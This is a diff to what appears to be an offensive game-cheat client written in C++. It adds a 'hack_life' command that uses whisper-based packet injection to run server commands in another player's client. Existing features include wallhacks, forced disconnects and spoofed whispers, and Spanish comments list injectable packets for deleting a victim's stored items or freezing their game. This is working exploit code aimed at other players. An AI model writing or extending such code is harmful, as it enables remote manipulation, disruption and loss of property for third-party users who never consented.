@@ -19,18 +19,19 @@ const map<string, string> Command::help_msgs = {
 	{"wallhack", "Enable or disable the wallhack. Syntax: wallhack 0/1"},
 	{"dc", "Start trying to disconnect the player. It sends by default 20 dc packets. Syntax: dc player [packets]"},
 	{"dc_stop", "Stop trying to disconnect the player. Syntax: dc_stop"},
+	{"hack_life", "Executes a server command in another player's client. Uses packet injection. Syntax: hack_life player cmd"},
 	{"inj", "Perform remote packet injection on player. Works bad. Syntax: inj player hexbuf"},
 	{"whisp", "Send a message to a player as if it had been sent by another player. Uses packet injection. Syntax: whisp type to_player from_player msg"}
 };
 Command* const Command::instance = new Command();
 
-void Command::set_id_attack(uint id_attack) {
-	instance->id_attack = id_attack;
-	print("New ID selected: " + to_string(id_attack));
+void Command::set_target(uint target) {
+	instance->target = target;
+	print("New ID selected: " + to_string(target));
 }
 
-uint Command::get_id_attack() {
-	return instance->id_attack;
+uint Command::get_target() {
+	return instance->target;
 }
 
 void Command::update_enemy(uint id, int x, int y){
@@ -89,10 +90,10 @@ void Command::move(byte type, int x, int y){
 }
 
 void Command::attack(){
-	if (instance->id_attack){
-		CG_Attack p(0, instance->id_attack);
+	if (instance->target){
+		CG_Attack p(0, instance->target);
 		p.send();
-		print("Attacked target " + to_string(instance->id_attack));
+		print("Attacked target " + to_string(instance->target));
 	} else print_err("There's no target.");
 }
 
@@ -165,6 +166,7 @@ void Command::_packet_injection(const string& username, Packet* p){
 		TPacketGCItemDel (HEADER_GC_SAFEBOX_DEL o HEADER_GC_MALL_DEL): borrar cosas del almacen mientras esté abierto
 		TPacketGCPhase: hace que el jugador solo vea el mapa y la UI y no pueda hacer nada
 		puede que chat: creo que no, lo que pongo como nullbytes es el id del que habla y tiene nullbyte
+			OJO que si, hay tipos de chat que no necesitan id
 		puede que TPacketGCPoints (HEADER_GC_CHARACTER_POINTS). no soy capaz de recibirlo, y es muuy largo (255 ints)
 		HEADER_GC_QUICKSLOT_ADD, HEADER_GC_QUICKSLOT_DEL, HEADER_GC_QUICKSLOT_SWAP: no muy util
 		puede que TPacketGCWarp: parece que hacen falta unos ids que solo estan en el sv y seguro que tienen nullbytes, aunque hace cosas raras
@@ -218,7 +220,8 @@ void Command::_packet_injection(const string& username, Packet* p){
 		buf += CG_Whisper(username, to_string(i) + string(INJECTION_PACKET_LEN, c++) + to_string(i)).get_buf();
 
 	// packet
-	buf += CG_Whisper(username, to_string(i) + string(78, c) + p_buf).get_buf();
+	//buf += CG_Whisper(username, to_string(i) + string(78, c) + p_buf).get_buf();
+	buf += CG_Whisper(username, to_string(i) + string(69, c) + p_buf).get_buf();
 
 	// Valid packet after malicious packet
 	c++;
@@ -266,6 +269,35 @@ void Command::packet_injection(const string& username, const string& hexbuf){
 	_packet_injection(username, &p);
 }
 
+void Command::porculing(){
+	// TESTING
+	if (instance->target && instance->enemies.count(instance->target)){
+		Enemy e = instance->enemies[instance->target];
+		cout << "Attacking enemy " << instance->target << " at (" << e.x << ", " << e.y << ")" << endl;
+		CG_Move p(3, 0x11, 0, e.x, e.y, 0);
+		p.send();
+		attack();
+	} else
+		print_err("Target not found!");
+}
+
+void Command::run_GC_command(const std::string& cmd){
+	// TODO
+	print("Running " + cmd);
+	//packet_struct* new_pkt_struct = new packet_struct(std_pkt_struct);
+	((void (__thiscall*)(packet_struct*, const char*))0x1bd140)(*(packet_struct**)0x0037e438, cmd.c_str());
+	//delete new_pkt_struct;
+}
+
+void Command::hack_life(const string& username, const string& cmd){
+	string msg = cmd;
+	msg += string(0x101 - 9 - msg.length(), ' ');
+	GC_Chat p(5, 0x01010101, msg);
+
+	_packet_injection(username, &p);
+	print("Hacked life");
+}
+
 void Command::run(const string& _cmd){
 	bool check = true;
 	vector<string> cmd = split(_cmd, ' ');
@@ -305,7 +337,7 @@ void Command::run(const string& _cmd){
 	} else if (cmd[0] == "shoot"){
 		// TESTING
 		string buf("\x33");
-		buf += p32(instance->id_attack);
+		buf += p32(instance->target);
 		buf += string("\x70\xa3\x0e\x00\x71\x81\x02\x00\x00", 9);
 		string buf2("\x36\x00\x00", 3);
 		Packet p1(buf);
@@ -334,6 +366,25 @@ void Command::run(const string& _cmd){
 	} else if (cmd[0] == "inj") {
 		if (check = check_n_args(2, cmd))
 			packet_injection(cmd[1], cmd[2]);
+
+	} else if (cmd[0] == "porculing"){
+		porculing();
+
+	} else if (cmd[0] == "run"){
+		if (check = check_n_args(1, cmd)){
+			string msg;
+			for (auto it = cmd.begin() + 1; it != cmd.end(); ++it)
+				msg += *it + " ";
+			run_GC_command(msg);
+		}
+	
+	} else if (cmd[0] == "hack_life"){
+		if (check = check_n_args(2, cmd)){
+			string msg;
+			for (auto it = cmd.begin() + 2; it != cmd.end(); ++it)
+				msg += *it + " ";
+			hack_life(cmd[1], msg);
+		}
 
 	} else print_err("Unknown command: " + cmd[0]);
 
